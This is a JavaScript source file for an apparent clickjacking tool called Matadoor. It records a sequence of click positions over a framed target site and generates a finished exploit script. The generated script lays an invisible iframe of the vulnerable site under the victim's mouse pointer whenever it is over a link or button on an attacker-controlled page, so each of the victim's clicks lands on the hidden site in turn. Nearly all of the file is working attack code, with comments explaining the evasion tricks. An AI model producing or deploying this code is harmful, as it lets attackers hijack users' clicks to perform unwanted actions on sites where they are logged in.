var loopInterval;
var mouseX=0;
var mouseY=0;
var blockScreen=0;
var actionList=[];
var numbAfterStart; 
var numbAfterClick; 
var startURL="";
var frameWidth=0;
var frameHeight=0;
var scroll_top=0;
var scroll_left=0;


window.onload=initialize;

onmousemove = function(e){
 scroll_top  = window.pageYOffset || document.documentElement.scrollTop;
 scroll_left = window.pageXOffset || document.documentElement.scrollLeft;
 mouseX=e.clientX+scroll_left;
 mouseY=e.clientY+scroll_top;
 moveMouseBlocks(mouseX, mouseY); // While mouse is over an iFrame of different origin - the code has no ability to read the mouse location. Yet you cannot cover the area under the mouse pointer cause the click needs to land on the iFrame. The workaround is to put 4 rectangles on the up, down, left and right of the pointer. If the pointer touches the rectangles - move them so that it doesn't touch them, but collect co-ordinates in the process. You can do that, cause to moment the pointer touches the rectangles you are back on the main origin. Even if it is just for a split second. 
}

function cancel()
{
 actionList=[];
 clearInterval(loopInterval);
 document.getElementById("frame").style.width="10px";
 document.getElementById("frame").style.height="10px";
 document.getElementById("frame").style.visibility="hidden";
 document.getElementById("finalize").style.display="none";
 document.getElementById("cancel").style.display="none";
 document.getElementById("menu").style.display="inline";
 document.getElementById("sUlabel").style.display="inline";
 document.getElementById("startURL").style.opacity=1;
 document.getElementById("startURL").style.width="200px";
 document.getElementById("instruction").style.display="inline";
 document.getElementById("frame").src="http://";
}

function moveMouseBlocks(x,y)
{
 document.getElementById("mouseUpBlock").style.top=(y-303)+"px";
 document.getElementById("mouseUpBlock").style.left=scroll_left+"px";
 document.getElementById("mouseDownBlock").style.top=(y+3)+"px";
 document.getElementById("mouseDownBlock").style.left=scroll_left+"px";
 document.getElementById("mouseRightBlock").style.left=(x+3)+"px";
 document.getElementById("mouseRightBlock").style.top=scroll_top+"px";
 document.getElementById("mouseLeftBlock").style.left=(x-303)+"px";
 document.getElementById("mouseLeftBlock").style.top=scroll_top+"px";
}


function log_click(x,y)
{
 adjustedX=x-document.getElementById("frame").getBoundingClientRect().left-scroll_left;
 adjustedY=y-document.getElementById("frame").getBoundingClientRect().top-scroll_top;
 console.log("Click Logged:", adjustedX, adjustedY);
 actionList.push({x:adjustedX, y:adjustedY, numbAfterClick: numbAfterClick}); 
 generateJS();
}

function generateJS()
{
var matadoorInput = { startURL: startURL, numbAfterStart: numbAfterStart, frameWidth: frameWidth, frameHeight: frameHeight, actionList: actionList, clickableTagNames: ["A","INPUT","BUTTON"], clickableClassName: "MATADOOR_CLICKABLE" }

var exp="<script>\n//Matadoor allows for clickjacking involving multiple stages. After each click in the iFrame - it moves the iFrame to the next (x,y) co-ordinates. Matadoor monitors which element has browser's focus. Moment when the iFrame receives the focus is interpretted as a click inside the iFrame. But that can just as well be caused by a text field or a button popping up inside that iFrame. For this reason for few seconds after the iFrame is created, and for few seconds after each click the Matadoor gets numb - will not react to any focus changes. Those values (in seconds) are kept in numbAfterStart and numbAfterClick variables. Those variables should cover the time till all elements in the iFrame are fully loaded (and hence will not be stealing focus any more).\n//Matadoor renders vulnerable iFrame under the pointer of a mouse whenever it is over a clickable object. Removes the iFrame when the pointer leaves the clickable object. Clickable objects are defined by variable clickableClassName and array clickableTagNames\n";
exp = exp + "\nvar matadoorInput = " + JSON.stringify(matadoorInput);
exp = exp + "\n\n// -----------------CODE BELOW THIS LINE IS ALWAYS THE SAME------------------\n";
exp = exp + "var mouseX=0;\nvar mouseY=0;\nvar numbFrame=1;\nvar overClickableObject=0;\nvar currentClickableObject;\nvar stage=0;\n\nfunction turnON_numbFrame()\n{\n document.getElementById(\"frame\").style.left=-9999;\n document.getElementById(\"frame\").style.top=-9999;\n numbFrame=1;\n}\n\nfunction turnOFF_numbFrame()\n{\n numbFrame=0;\n}\n\nfunction initialize()\n{\n document.getElementsByTagName(\"body\")[0].innerHTML=\"<iframe id='ownFrame' src='\"+window.location.href+\"' style='position: fixed; top: 0px; bottom: 0px; right: 0px; width: 100%; border: none; margin: 0; padding: 0; overflow: hidden; height: 100%;' ></iframe><input type='text' id='dummy' style='width:1px; height:1px; opacity:0'> <div id='mouseUpBlock' style='position:absolute;top:0;left:0;bottom:0;right:0;height:300px;width:100%;z-index: 11;background-color: rgba(155, 0, 0, 0.0)';></div><div id='mouseDownBlock' style='position:absolute;top:0;left:0;bottom:0;right:0;height:300px;width:100%;z-index: 11;background-color: rgba(155, 0, 0, 0.0)';></div><div id='mouseRightBlock' style='position:absolute;top:0;left:0;bottom:0;right:0;height:100%;width:300px;z-index: 11;background-color: rgba(155, 0, 0, 0.0)';></div><div id='mouseLeftBlock' style='position:absolute;top:0;left:0;bottom:0;right:0;height:100%;width:300px;z-index: 11;background-color: rgba(155, 0, 0, 0.0)';></div> <iframe id='frame' src='\"+ matadoorInput.startURL + \"' style='width: \"+ matadoorInput.frameWidth +\"px;height: \"+ matadoorInput.frameHeight + \"px;position: absolute;left: -40;top: 130;z-index: 10;opacity: 0.0;' ></iframe>\";\n document.getElementsByTagName(\"body\")[0].style=\"overflow: hidden;\";\n keepFocusOnTextField();\n function isClickable(element) {\n     var node = element;\n     while (node != null) {\n         if (matadoorInput.clickableTagNames.includes(node.tagName)) {\n             return true;\n         }\n         if ((node.classList) && (node.classList.contains(matadoorInput.clickableClassName))) {\n             return true;\n         }\n         node = node.parentNode;\n     }\n     return false;\n}\n \n function moveMouseBlocks(x,y)\n {\n  document.getElementById(\"mouseUpBlock\").style.top=(y-303)+\"px\";\n  document.getElementById(\"mouseDownBlock\").style.top=(y+3)+\"px\";\n  document.getElementById(\"mouseRightBlock\").style.left=(x+3)+\"px\";\n  document.getElementById(\"mouseLeftBlock\").style.left=(x-303)+\"px\";\n  var hoverElement = document.getElementById(\"ownFrame\").contentWindow.document.elementFromPoint(mouseX, mouseY) \n  if (isClickable(hoverElement)) \n  {\n   overClickableObject=1;\n   currentClickableObject=hoverElement;\n  }\n  else\n  {\n   overClickableObject=0;\n  }\n  moveVulnIframe();\n }\n \n function moveVulnIframe()\n {\n  if ((overClickableObject) && (!(numbFrame)) && (matadoorInput.actionList[stage]) )\n  {\n   document.getElementById(\"frame\").style.left=mouseX - matadoorInput.actionList[stage].x;\n   document.getElementById(\"frame\").style.top=mouseY - matadoorInput.actionList[stage].y;\n  }\n  else\n  {\n   document.getElementById(\"frame\").style.left=-9999;\n   document.getElementById(\"frame\").style.top=-9999;\n  }\n }\n \n \n document.getElementById(\"ownFrame\").contentWindow.onmousemove = function(e){\n  mouseX=e.clientX;\n  mouseY=e.clientY;\n  moveMouseBlocks(mouseX,mouseY);\n }\n onmousemove = function(e){\n  mouseX=e.clientX;\n  mouseY=e.clientY;\n  moveMouseBlocks(mouseX,mouseY);\n }\n \n function log_click(x,y)\n {\n  stage=stage+1;\n  if (!(matadoorInput.actionList[stage] ))\n  {\n   clearInterval(loopInterval);\n  }\n  currentClickableObject.click();\n  \n }\n \n function keepFocusOnTextField()\n {\n\n  var counter=0; // ticks of passing 0.25s intervals\n  var clickLogged=0;  // Was a click recognized? When click detected - don't grab focus right away. Give the user time to release the mouse button. Otherwise it will not be a valid click for the iFramed website.\n \n \n  timeLock=matadoorInput.numbAfterStart*4;    // Whenever delaying any action, script uses timeLock variable. Here it prevents Matadoor from interpreting initial focus changes during loading of the iFrame. For example if the iframed website is a search engine - it will surely put a \"|\" prompt on its search box. That is a sign of grabing focus into that box. If you do not use the \"numb\" variable, or it is too short and the numb period ends before the search box gets rendered - Matador will falsely interpret this as a click.\n  function setFocus () { \n   counter=counter+1;\n    \n\n    var dummyEl = document.getElementById(\"dummy\");  \n    var isFocused = (document.activeElement !== document.getElementById(\"frame\"));\n    if (!(isFocused)){      // Enter if focus on iFrame detected\n      if (counter >timeLock)   // Make sure not in numb period\n      { \n       if (clickLogged)   // The click was already logged, the user had time to release the button, now its time to block user's input for a while - to make sure that the next clicks happen after the page is fully rendered. \n       {\n        counter=0;\n        timeLock=matadoorInput.actionList[stage].numbAfterClick*4;\n        turnON_numbFrame();\n        dummyEl.focus();\n        clickLogged = 0;\n       }\n       else  // User has clicked. Log it, but give him a moment to release a button. For a browser a click is a key_down and key_up event duo. If you take the focus out of the iframe before the key_up happens - the iFrame will do nasty things. \n       {\n        log_click(mouseX, mouseY);\n        clickLogged = 1;\n        counter=0;\n        timeLock=3;   //time for a user to release the button. Three ticks = 0.75 seconds\n       }\n      }\n      else\n      {\n       if (numbFrame) \n       {\n        dummyEl.focus();   // Matadoor needs to shift focus to any object other than the iFrame. Otherwise it will not recognize any further clicks. The whole trick is about interpreting a focus switch as a click. If the focus stays on the iFrame - there will be no further switches, and no further recognized clicks. \n       }\n      }\n     }\n     else\n     {\n      if (counter > timeLock)   // iFrame not in focus, numb period gone - it's clear to remove the block screen and allow the user to register more clicks\n       {\n          turnOFF_numbFrame();\n       }\n     }\n     \n  \n  \n  }\n  loopInterval = setInterval(setFocus, 250);\n } \n\n}\n\n//Trick here is that the vulnerable page is not the only iFrame in the scenario. The website you control is also opened in the iFrame. This way the code storing Matadoor data is the parrent frame, allowing to survive mutliple clicks within the controlled website. Controlled website is opened in a full-window iFrame, so it looks genuine but doesn't kill the Matadoor session during clicking links. Vulnerable page is in the iFrame under your pointer.\nif (window.self === window.top ) \n{\n console.log(\"Starting Matadoor\");\n window.onload=initialize;\n}";
exp= exp+"\n</script>";
document.getElementById("tarea").value=exp;

}

function turnON_blockScreen()
{
 document.getElementById("blocker").style.zIndex=9;
 blockScreen=1;
}

function turnOFF_blockScreen()
{
 document.getElementById("blocker").style.zIndex=-9;
 blockScreen=0;
}



function start() {
  frameWidth=document.getElementById("fwidth").value;
  frameHeight=document.getElementById("fheight").value;
  startURL=document.getElementById("startURL").value;
  document.getElementById("frame").style.width=document.getElementById("fwidth").value +"px";
  document.getElementById("frame").style.height=document.getElementById("fheight").value +"px";
  document.getElementById("frame").style.visibility="visible";
  document.getElementById("finalize").style.display="inline";
  document.getElementById("cancel").style.display="inline";
  document.getElementById("menu").style.display="none";
  document.getElementById("sUlabel").style.display="none";
  document.getElementById("startURL").style.opacity=0;
  document.getElementById("startURL").style.width="1px";
  document.getElementById("instruction").style.display="none";
  document.getElementById("frame").src=startURL;
  if   ((document.getElementById("fwidth").value != parseInt(window.innerWidth)-40) || (document.getElementById("fheight").value != parseInt(window.innerHeight)-80))
  {
   document.getElementsByTagName("body")[0].style.overflow="inherit";
  }
  numbAfterStart=document.getElementById("numbStart").value;
  numbAfterClick=document.getElementById("numbClick").value;
  turnON_blockScreen();
  keepFocusOnTextField();
}

function initialize() {
  frameWidth=parseInt(window.innerWidth)-40;
  frameHeight=parseInt(window.innerHeight)-80;
  document.getElementById("fwidth").value=parseInt(window.innerWidth)-40;
  document.getElementById("fheight").value=parseInt(window.innerHeight)-80;
}

function finalize() {
  document.getElementById("finalizer").style.zIndex=12;
  document.getElementById("finalizer").style.display="block";
}

function closeFinalizer() {
  document.getElementById("finalizer").style.zIndex=-12;
  document.getElementById("finalizer").style.display="none";
}


function keepFocusOnTextField()
{

 var counter=0; // ticks of passing 0.25s intervals
 var clickLogged=0;  // Was a click recognized? When click detected - don't grab focus right away. Give the user time to release the mouse button. Otherwise it will not be a valid click for the iFramed website.
 
 
  timeLock=numbAfterStart*4;    // Whenever delaying any action, script uses timeLock variable. Here it prevents Matadoor from interpreting initial focus changes during loading of the iFrame. For example if the iframed website is a search engine - it will surely put a "|" prompt on its search box. That is a sign of grabing focus into that box. If you do not use the "numb" variable, or it is too short and the numb period ends before the search box gets rendered - Matador will falsely interpret this as a click.
  function setFocus () { 
   counter=counter+1;
    console.log(counter);
    if (blockScreen)
    {
     document.getElementById("myProgress").style.display="block";
     document.getElementById("myBar").style.width=((counter*100)/timeLock)+"%";
    }
    else
    {
     document.getElementById("myProgress").style.display="none";
    }
    

    var dummyEl = document.getElementById("startURL");  
    var isFocused = (document.activeElement !== document.getElementById("frame"));
    if (!(isFocused)){      // Enter if focus on iFrame detected
      if (counter >timeLock)   // Make sure not in numb period
      { 
       if (clickLogged)   // The click was already logged, the user had time to release the button, now its time to block user's input for a while - to make sure that the next clicks happen after the page is fully rendered. 
       {
        counter=0;
        timeLock=numbAfterClick*4;
        turnON_blockScreen();
        dummyEl.focus();
        clickLogged = 0;
       }
       else  // User has clicked. Log it, but give him a moment to release a button. For a browser a click is a key_down and key_up event duo. If you take the focus out of the iframe before the key_up happens - the iFrame will do nasty things. 
       {
        log_click(mouseX, mouseY);
        clickLogged = 1;
        counter=0;
        timeLock=3;   //time for a user to release the button. Three ticks = 0.75 seconds
       }
      }
      else
      {
       if (blockScreen) 
       {
        dummyEl.focus();   // Matadoor needs to shift focus to any object other than the iFrame. Otherwise it will not recognize any further clicks. The whole trick is about interpreting a focus switch as a click. If the focus stays on the iFrame - there will be no further switches, and no further recognized clicks. 
       }
      }
     }
     else
     {
      if (counter > timeLock)   // iFrame not in focus, numb period gone - it's clear to remove the block screen and allow the user to register more clicks
       {
          turnOFF_blockScreen();
       }
     }
     
  
  
  }
  loopInterval = setInterval(setFocus, 250);
}
